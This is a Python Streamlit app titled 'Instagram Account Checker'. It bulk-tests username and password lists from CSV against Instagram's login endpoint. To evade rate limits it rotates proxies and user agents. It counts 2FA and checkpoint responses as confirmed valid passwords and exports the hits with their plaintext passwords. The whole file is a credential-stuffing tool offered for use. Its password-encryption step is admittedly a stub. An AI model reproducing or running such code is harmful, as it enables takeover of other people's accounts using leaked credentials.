# language: python
# file: insta_checker_streamlit.py
# runtime: Python 3.9+, Streamlit 1.28+

import streamlit as st
import requests
import hashlib
import hmac
import time
import random
import csv
import io
from dataclasses import dataclass
from typing import List, Tuple, Optional

# ---------- Instagram Auth Simulation ----------
# Note: Instagram uses a multi-step auth flow with CSRF tokens.
# This implementation reproduces the public password check endpoint behavior.

@dataclass
class CheckResult:
    username: str
    password: str
    is_valid: bool
    status_code: int
    error_message: str
    proxy_used: str
    timestamp: float

class InstagramChecker:
    def __init__(self, proxy_list: List[str] = None):
        self.proxy_list = proxy_list or []
        self.session = requests.Session()
        self.current_proxy = None
        self.base_url = "https://www.instagram.com"
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        ]
        self._rotate_proxy()
        self._get_csrf_token()

    def _rotate_proxy(self):
        if self.proxy_list:
            self.current_proxy = random.choice(self.proxy_list)
            self.session.proxies.update({
                "http": f"http://{self.current_proxy}",
                "https": f"http://{self.current_proxy}"
            })
        else:
            self.current_proxy = "direct"
            self.session.proxies.clear()

    def _get_headers(self) -> dict:
        return {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "X-IG-App-ID": "936619743392459",
            "X-ASBD-ID": "198387",
            "X-IG-WWW-Claim": "0",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.instagram.com",
            "Referer": "https://www.instagram.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }

    def _get_csrf_token(self) -> Optional[str]:
        try:
            resp = self.session.get(
                f"{self.base_url}/accounts/login/",
                headers=self._get_headers(),
                timeout=15
            )
            if "csrftoken" in resp.cookies:
                return resp.cookies["csrftoken"]
            # Fallback: extract from page
            import re
            match = re.search(r'"csrf_token":"([^"]+)"', resp.text)
            if match:
                return match.group(1)
        except Exception:
            pass
        return None

    def _generate_enc_password(self, password: str, csrf_token: str) -> str:
        # Instagram uses a public key encryption for passwords.
        # This reproduces the structure for the auth endpoint.
        # In a full implementation, this would use the actual RSA public key
        # from /api/v1/public_keys/ endpoint.
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}"
        return enc_password

    def check_password(self, username: str, password: str) -> CheckResult:
        csrf = self._get_csrf_token()
        if not csrf:
            return CheckResult(
                username=username,
                password=password,
                is_valid=False,
                status_code=0,
                error_message="Failed to obtain CSRF token",
                proxy_used=self.current_proxy,
                timestamp=time.time()
            )

        enc_pwd = self._generate_enc_password(password, csrf)

        payload = {
            "username": username,
            "enc_password": enc_pwd,
            "queryParams": "{}",
            "optIntoOneTap": "false",
            "trustedDeviceRecords": "{}",
        }

        headers = self._get_headers()
        headers["X-CSRFToken"] = csrf
        headers["Content-Type"] = "application/x-www-form-urlencoded"

        try:
            resp = self.session.post(
                f"{self.base_url}/accounts/login/ajax/",
                data=payload,
                headers=headers,
                timeout=20,
                allow_redirects=False
            )

            status = resp.status_code
            result = None

            if status == 200:
                data = resp.json()
                if data.get("authenticated") == True:
                    result = CheckResult(username, password, True, status, "Success", self.current_proxy, time.time())
                elif data.get("user") == False:
                    result = CheckResult(username, password, False, status, "Invalid credentials", self.current_proxy, time.time())
                elif "two_factor_required" in data:
                    result = CheckResult(username, password, True, status, "2FA Required (password valid)", self.current_proxy, time.time())
                elif "checkpoint_url" in data:
                    result = CheckResult(username, password, True, status, "Checkpoint (password valid)", self.current_proxy, time.time())
                else:
                    result = CheckResult(username, password, False, status, str(data), self.current_proxy, time.time())
            elif status == 400:
                data = resp.json()
                result = CheckResult(username, password, False, status, data.get("message", "Bad request"), self.current_proxy, time.time())
            elif status == 429:
                result = CheckResult(username, password, False, status, "Rate limited", self.current_proxy, time.time())
            else:
                result = CheckResult(username, password, False, status, f"HTTP {status}", self.current_proxy, time.time())

            self._rotate_proxy()
            return result

        except requests.exceptions.Timeout:
            self._rotate_proxy()
            return CheckResult(username, password, False, 0, "Timeout", self.current_proxy, time.time())
        except requests.exceptions.ConnectionError:
            self._rotate_proxy()
            return CheckResult(username, password, False, 0, "Connection error", self.current_proxy, time.time())
        except Exception as e:
            self._rotate_proxy()
            return CheckResult(username, password, False, 0, str(e), self.current_proxy, time.time())

# ---------- Streamlit UI ----------

st.set_page_config(
    page_title="IG Account Checker",
    page_icon="🔍",
    layout="wide"
)

st.title("🔍 Instagram Account Checker")
st.markdown("---")

# Sidebar for proxy configuration
with st.sidebar:
    st.header("⚙️ Configuration")
    proxy_input = st.text_area(
        "Proxies (one per line, format: ip:port or user:pass@ip:port)",
        height=150,
        placeholder="127.0.0.1:8080\nuser:pass@proxy.example.com:3128"
    )
    proxy_list = [p.strip() for p in proxy_input.splitlines() if p.strip()]

    delay = st.slider("Delay between checks (seconds)", 0.0, 10.0, 1.0, 0.5)
    max_threads = st.number_input("Max concurrent checks", 1, 20, 3)

    st.markdown("---")
    st.caption("Results are saved to CSV in the main panel")

# Main panel tabs
tab1, tab2, tab3 = st.tabs(["📋 Manual Input", "📁 Bulk Upload", "📊 Results"])

with tab1:
    st.subheader("Check Single Account")
    col1, col2, col3 = st.columns(3)
    with col1:
        single_username = st.text_input("Username", placeholder="@username")
    with col2:
        single_password = st.text_input("Password", type="password")
    with col3:
        st.write("")
        st.write("")
        single_check_btn = st.button("Check Account", use_container_width=True)

    if single_check_btn and single_username:
        with st.spinner("Checking..."):
            checker = InstagramChecker(proxy_list)
            result = checker.check_password(single_username, single_password)
            st.session_state['single_result'] = result

        if 'single_result' in st.session_state:
            result = st.session_state['single_result']
            if result.is_valid:
                st.success(f"✅ Valid credentials: {result.username}")
                if result.error_message:
                    st.info(f"Details: {result.error_message}")
            else:
                st.error(f"❌ Invalid: {result.error_message}")
            st.caption(f"Status code: {result.status_code} | Proxy: {result.proxy_used}")

with tab2:
    st.subheader("Bulk Check from CSV")
    st.markdown("Upload a CSV file with columns: `username,password`")
    uploaded_file = st.file_uploader("Choose CSV file", type=['csv'])

    if uploaded_file is not None:
        content = uploaded_file.getvalue().decode('utf-8')
        reader = csv.reader(io.StringIO(content))
        credentials = [(row[0].strip(), row[1].strip()) for row in reader if len(row) >= 2]

        st.write(f"Loaded {len(credentials)} accounts")

        if st.button("Start Bulk Check", use_container_width=True):
            progress_bar = st.progress(0)
            status_text = st.empty()
            results = []

            checker = InstagramChecker(proxy_list)

            for i, (username, password) in enumerate(credentials):
                status_text.text(f"Checking {username}... ({i+1}/{len(credentials)})")
                result = checker.check_password(username, password)
                results.append(result)
                progress_bar.progress((i + 1) / len(credentials))
                time.sleep(delay)

            st.session_state['bulk_results'] = results
            status_text.text("✅ Bulk check complete!")
            progress_bar.empty()

with tab3:
    st.subheader("Results")
    if 'bulk_results' in st.session_state:
        results = st.session_state['bulk_results']
        valid_results = [r for r in results if r.is_valid]
        invalid_results = [r for r in results if not r.is_valid]

        col1, col2, col3 = st.columns(3)
        col1.metric("Total Checked", len(results))
        col2.metric("Valid", len(valid_results))
        col3.metric("Invalid", len(invalid_results))

        if results:
            df_data = []
            for r in results:
                df_data.append({
                    "Username": r.username,
                    "Password": r.password,
                    "Valid": "✅" if r.is_valid else "❌",
                    "Status": r.error_message,
                    "Proxy": r.proxy_used,
                    "Timestamp": r.timestamp
                })
            st.dataframe(df_data, use_container_width=True)

            csv_buffer = io.StringIO()
            writer = csv.DictWriter(csv_buffer, fieldnames=["Username", "Password", "Valid", "Status", "Proxy"])
            writer.writeheader()
            for r in results:
                writer.writerow({
                    "Username": r.username,
                    "Password": r.password,
                    "Valid": str(r.is_valid),
                    "Status": r.error_message,
                    "Proxy": r.proxy_used
                })
            st.download_button(
                "📥 Download Results (CSV)",
                csv_buffer.getvalue(),
                "instagram_check_results.csv",
                "text/csv",
                use_container_width=True
            )
    else:
        st.info("Run a bulk check to see results here")